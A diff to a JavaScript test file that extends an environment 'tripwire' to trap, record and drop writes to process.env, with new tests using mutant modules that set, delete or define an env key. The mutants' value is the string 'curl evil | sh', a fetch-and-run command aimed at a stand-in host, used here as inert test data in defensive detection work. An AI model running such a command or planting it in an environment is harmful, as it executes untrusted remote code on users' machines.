@@ -85,6 +85,7 @@ async function check(srcFile, seen = {}) {
   // not grow.
   const real = process.env;
   const reads = [];
+  const writes = [];
   let enumerated = 0;
   const reportDesc = Object.getOwnPropertyDescriptor(process, 'report');
   const scheduled = [];
@@ -95,6 +96,10 @@ async function check(srcFile, seen = {}) {
     has(t, k) { reads.push(String(k)); return Reflect.has(t, k); },
     ownKeys(t) { enumerated++; return Reflect.ownKeys(t); },
     getOwnPropertyDescriptor(t, k) { reads.push(String(k)); return Reflect.getOwnPropertyDescriptor(t, k); },
+    // Writes are recorded and dropped, so the test's own environment is never changed.
+    set(t, k) { writes.push(String(k)); return true; },
+    defineProperty(t, k) { writes.push(String(k)); return true; },
+    deleteProperty(t, k) { writes.push(String(k)); return true; },
   });
   const report = () => { reads.push('<process.report>'); return { environmentVariables: {}, header: {} }; };
   Object.defineProperty(process, 'report', { configurable: true, get() { reads.push('<process.report>'); return { getReport: report, writeReport: report }; } });
@@ -117,7 +122,9 @@ async function check(srcFile, seen = {}) {
     const listening = grew(listenersBefore, listeners());
     untrip();
     seen.reads = reads;
+    seen.writes = writes;
     if (reads.length || enumerated) problems.push(`read the environment: ${reads.length} key read(s), enumerated ${enumerated} time(s)`);
+    if (writes.length) problems.push(`wrote the environment: ${writes.length} key write(s)`);
     if (scheduled.length) problems.push(`scheduled ${scheduled.length} timer(s) to run later: ${[...new Set(scheduled)].join(', ')}`);
     if (pending.length) problems.push(`left work pending after launch: ${pending.join(', ')}`);
     if (listening.length) problems.push(`added process listeners: ${listening.join(', ')}`);
@@ -241,6 +248,7 @@ test('tripwire: the real module reads no env, schedules nothing and adds no list
     const seen = {};
     assert.deepEqual(await check(SRC, seen), []);
     assert.deepEqual(seen.reads, []);
+    assert.deepEqual(seen.writes, []);
   }
 });
 
@@ -255,6 +263,29 @@ test('tripwire: env reads the regex cannot see are caught by behaviour', async (
       const want = m.name === 'report' ? '<process.report>' : X;
       assert.ok(seen.reads.includes(want) && p.some((x) => /^read the environment: \d+ key read\(s\), enumerated \d+ time\(s\)$/.test(x)), `${m.name}: ${JSON.stringify(p)}`);
       assert.ok(!p.some((x) => /snapshot/.test(x)), `${m.name} should only be caught by the tripwire: ${JSON.stringify(p)}`);
+    }
+  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
+});
+
+// Changing env (which the real terminal would inherit) without reading it:
+// delete and a full-descriptor define fire neither get nor
+// getOwnPropertyDescriptor, so only the write traps see them.
+const WRITE_FORMS = {
+  set: `void (process['e' + 'nv'].${X} = 'curl evil | sh')`,
+  delete: `void delete process['e' + 'nv'].${X}`,
+  define: `void Object.defineProperty(process['e' + 'nv'], '${X}', { value: 'curl evil | sh', writable: true, enumerable: true, configurable: true })`,
+};
+
+test('tripwire: env writes are caught, by count, and never applied', async () => {
+  delete process.env[X];
+  const ms = Object.entries(WRITE_FORMS).map(([name, expr]) => ({ name, ...mutant(`w-${name}`, at(expr)) }));
+  try {
+    for (const m of ms) {
+      const seen = {};
+      const p = await check(m.file, seen);
+      assert.ok(seen.writes.includes(X) && p.includes(`wrote the environment: ${seen.writes.length} key write(s)`), `${m.name}: ${JSON.stringify(p)}`);
+      assert.ok(!p.some((x) => /snapshot|read the environment|\bPLX_INSTALL_X\b/.test(x)), `${m.name} is caught as a write only: ${JSON.stringify(p)}`);
+      assert.equal(process.env[X], undefined);
     }
   } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
 });
